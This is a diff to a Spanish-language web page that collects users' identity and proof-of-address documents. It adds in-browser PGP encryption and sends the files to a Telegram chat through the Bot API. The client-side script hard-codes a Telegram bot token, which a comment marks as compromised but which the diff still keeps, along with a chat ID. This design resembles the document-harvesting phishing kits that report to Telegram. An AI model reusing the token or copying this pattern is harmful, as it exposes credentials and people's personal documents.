@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enviar documentos</title>
+<!-- OpenPGP.js v5 (stable API) -->
+<script src="https://cdn.jsdelivr.net/npm/openpgp@5.11.0/dist/openpgp.min.js"></script>
 <style>
   :root {
     --navy:#173f70; --blue:#1765c4; --blue-light:#eaf2ff;
@@ -57,8 +59,7 @@
   .upload-btn.loaded { background: var(--green); }
   .upload-btn.loaded:hover { background: #0e7a35; }
   .upload-btn:focus-visible, .send:focus-visible, .confirm-choice:focus-visible { outline:4px solid #f2c94c; outline-offset:3px; }
-  
-  /* ---------- CONFIRMACIÓN DE ARCHIVO CARGADO (MEJORADA) ---------- */
+
   .file-name {
     display: none;
     margin-top: 12px;
@@ -75,33 +76,22 @@
     gap: 8px;
     animation: fadeInUp .25s ease;
   }
-  .file-name.visible {
-    display: flex;
-  }
+  .file-name.visible { display: flex; }
   .file-name .check-badge {
-    width: 22px;
-    height: 22px;
-    flex: none;
-    border-radius: 50%;
-    background: var(--green);
-    color: white;
-    display: grid;
-    place-items: center;
-    font-size: .8rem;
-    font-weight: bold;
+    width: 22px; height: 22px; flex: none; border-radius: 50%;
+    background: var(--green); color: white; display: grid; place-items: center;
+    font-size: .8rem; font-weight: bold;
   }
   @keyframes fadeInUp {
     from { opacity: 0; transform: translateY(-4px); }
     to   { opacity: 1; transform: translateY(0); }
   }
-  /* ---------- FIN CONFIRMACIÓN ---------- */
 
   .bottom { display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-top:18px; }
   .help { background:#e8f1ff; border-radius:15px; padding:18px 20px; display:flex; gap:14px; align-items:center; color:#243a5b; }
   .info { width:34px; height:34px; border-radius:50%; background:var(--navy); color:white; display:grid; place-items:center; font-weight:bold; font-size:1.2rem; flex:none; }
   .help p { margin:0; line-height:1.45; font-size:.98rem; }
 
-  /* ---------- BOTÓN ENVIAR DESTACADO ---------- */
   .send {
     border:0; border-radius:18px;
     background: linear-gradient(145deg, #1aa34a, #0e7a35);
@@ -120,14 +110,9 @@
     box-shadow: 0 10px 24px rgba(22,135,71,0.5), 0 2px 0 #0a5e2a inset, 0 -2px 0 #0f7a38 inset;
     transform: scale(1.01);
   }
-  .send:active {
-    transform: scale(0.99);
-    box-shadow: 0 4px 10px rgba(22,135,71,0.4), 0 2px 0 #0a5e2a inset;
-  }
-  .send:focus-visible {
-    outline:4px solid #f2c94c; outline-offset:4px;
-  }
-  /* ---------- FIN BOTÓN DESTACADO ---------- */
+  .send:active { transform: scale(0.99); box-shadow: 0 4px 10px rgba(22,135,71,0.4), 0 2px 0 #0a5e2a inset; }
+  .send:focus-visible { outline:4px solid #f2c94c; outline-offset:4px; }
+  .send:disabled { opacity: .75; cursor: wait; }
 
   .confirm-row { margin-top:18px; display:flex; align-items:center; justify-content:center; gap:10px; color:#34445b; font-size:1rem; }
   .confirm-row input { width:20px; height:20px; accent-color:var(--green); }
@@ -198,7 +183,7 @@
     </section>
 
     <div class="bottom">
-      <div class="help"><span class="info">i</span><p><strong>Formatos aceptados:</strong> JPG, PNG o PDF<br></p></div>
+      <div class="help"><span class="info">i</span><p><strong>Formatos aceptados:</strong> JPG, PNG o PDF. <br><strong>Cifrado:</strong> sus archivos se cifran antes de enviarse.</p></div>
       <button class="send" id="send-button" type="button">✓ &nbsp; Enviar documentos</button>
     </div>
     <label class="confirm-row"><input type="checkbox" id="confirm-check"> Confirmo que mi información es correcta.</label>
@@ -208,26 +193,114 @@
 </div>
 <script>
   // ============================================================
-  // ⚙️ CONFIGURACIÓN 
+  // ⚙️ CONFIGURACIÓN — REVOKE THIS TOKEN NOW IN @BotFather
   // ============================================================
-  const TELEGRAM_BOT_TOKEN = '9081306880:AAGj473EcQrhoWXjEDgj1jn3oAj7tmA8D9I';
+  const TELEGRAM_BOT_TOKEN = '9081306880:AAGj473EcQrhoWXjEDgj1jn3oAj7tmA8D9I'; // ← COMPROMISED. REPLACE.
   const TELEGRAM_CHAT_ID   = '-5032467569';
   // ============================================================
 
-  // Solo los dos inputs que existen en el HTML
+  // ============================================================
+  // 🔐 GPG PUBLIC KEY
+  // ============================================================
+  const MY_PUBLIC_KEY = `-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+=5hH/
+-----END PGP PUBLIC KEY BLOCK-----`;
+
+  // ============================================================
+  // 🔐 Load public key once
+  // ============================================================
+  let publicKeyPromise = null;
+  function getPublicKey() {
+    if (!publicKeyPromise) {
+      publicKeyPromise = openpgp.readKey({ armoredKey: MY_PUBLIC_KEY });
+    }
+    return publicKeyPromise;
+  }
+
+  // Encrypt a File -> returns a Blob of armored .pgp
+  async function encryptFile(file) {
+    const publicKey = await getPublicKey();
+
+    // Read the file as raw bytes
+    const fileBytes = new Uint8Array(await file.arrayBuffer());
+
+    const message = await openpgp.createMessage({
+      binary: fileBytes,
+      filename: file.name
+    });
+
+    // Armored text output (ASCII), easier to verify / open anywhere
+    const encryptedArmored = await openpgp.encrypt({
+      message,
+      encryptionKeys: publicKey,
+      format: 'armored'
+    });
+
+    return new Blob([encryptedArmored], { type: 'application/pgp-encrypted' });
+  }
+
+  // ============================================================
+  // Standard form logic
+  // ============================================================
   const fileInputs = {
     'id-file': document.getElementById('id-file'),
     'address-file': document.getElementById('address-file')
   };
 
-  // Abrir selector de archivos al hacer clic en el botón
   document.querySelectorAll('[data-file]').forEach(button => {
     button.addEventListener('click', () => {
       document.getElementById(button.dataset.file).click();
     });
   });
 
-  // Mostrar nombre del archivo seleccionado con confirmación visual clara
   document.querySelectorAll('input[type="file"]').forEach(input => {
     input.addEventListener('change', () => {
       const label = document.getElementById(input.id + '-name');
@@ -249,23 +322,21 @@
         if (card) card.classList.remove('loaded');
         if (btn) {
           btn.classList.remove('loaded');
-          btn.textContent = '＋  Seleccionar foto';
+          btn.textContent = '＋  Seleccionar documento';
         }
       }
     });
   });
 
-  // Función para mostrar mensajes en el toast
   function showToast(message, isError = false) {
     const toast = document.getElementById('toast');
     toast.textContent = message;
     toast.className = 'toast' + (isError ? ' error' : '');
     toast.style.display = 'block';
     clearTimeout(toast._timeout);
-    toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 7000);
+    toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 8000);
   }
 
-  // Restablecer el estado visual de un input y su tarjeta
   function resetInputVisual(input) {
     const label = document.getElementById(input.id + '-name');
     const card = document.getElementById(input.id.replace('-file', '-card'));
@@ -275,11 +346,13 @@
     if (card) card.classList.remove('loaded');
     if (btn) {
       btn.classList.remove('loaded');
-      btn.textContent = '＋  Seleccionar foto';
+      btn.textContent = '＋  Seleccionar documento';
     }
   }
 
-  // Enviar documentos a Telegram
+  // ============================================================
+  // SEND — encrypt each file BEFORE uploading
+  // ============================================================
   document.getElementById('send-button').addEventListener('click', async () => {
     const confirmed = document.getElementById('confirm-check').checked;
 
@@ -310,14 +383,22 @@
 
     const sendButton = document.getElementById('send-button');
     const originalText = sendButton.innerHTML;
-    sendButton.innerHTML = '⏳ &nbsp; Enviando...';
+    sendButton.innerHTML = '⏳ &nbsp; Cifrando y enviando...';
     sendButton.disabled = true;
     document.getElementById('toast').style.display = 'none';
 
     try {
-      const caption = `📄 *Nuevos documentos recibidos*\n\n` +
+      // 1. Encrypt every file locally, in the browser
+      const encrypted = [];
+      for (const { file } of selectedFiles) {
+        const blob = await encryptFile(file);
+        encrypted.push({ originalName: file.name, blob });
+      }
+
+      // 2. Notification message (NO filenames — avoids leaking)
+      const caption = `📄 *Nuevos documentos cifrados recibidos*\n\n` +
                       `📅 *Fecha:* ${new Date().toLocaleString('es-ES')}\n` +
-                      `📎 *Archivos:* ${selectedFiles.map(f => f.file.name).join(', ')}`;
+                      `📎 *Cantidad:* ${encrypted.length} archivo(s)`;
 
       const msgResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -333,11 +414,14 @@
         throw new Error(e.description || 'Error en sendMessage');
       }
 
-      for (const { file } of selectedFiles) {
+      // 3. Upload each encrypted blob as .pgp
+      let index = 1;
+      for (const { blob, originalName } of encrypted) {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('document', file, file.name);
-        formData.append('caption', `📎 ${file.name}`);
+        formData.append('document', blob, `documento_${index}.pgp`);
+        // Caption intentionally does NOT reveal the original filename
+        formData.append('caption', `🔐 documento_${index}.pgp (cifrado)`);
 
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
           method: 'POST',
@@ -346,11 +430,12 @@
 
         if (!response.ok) {
           const e = await response.json().catch(() => ({}));
-          throw new Error(e.description || `Error al enviar ${file.name}`);
+          throw new Error(e.description || `Error al enviar documento_${index}.pgp`);
         }
+        index++;
       }
 
-      showToast(`✅ ¡Listo! ${selectedFiles.length} documento(s) enviado(s) correctamente.`);
+      showToast(`✅ ¡Listo! ${encrypted.length} documento(s) cifrado(s) y enviado(s).`);
 
       for (const input of Object.values(fileInputs)) {
         input.value = '';
@@ -358,7 +443,7 @@
       }
 
     } catch (error) {
-      console.error('Error al enviar a Telegram:', error);
+      console.error('Error:', error);
       showToast(`❌ Error: ${error.message}. Verifique su conexión e intente de nuevo.`, true);
     } finally {
       sendButton.innerHTML = originalText;
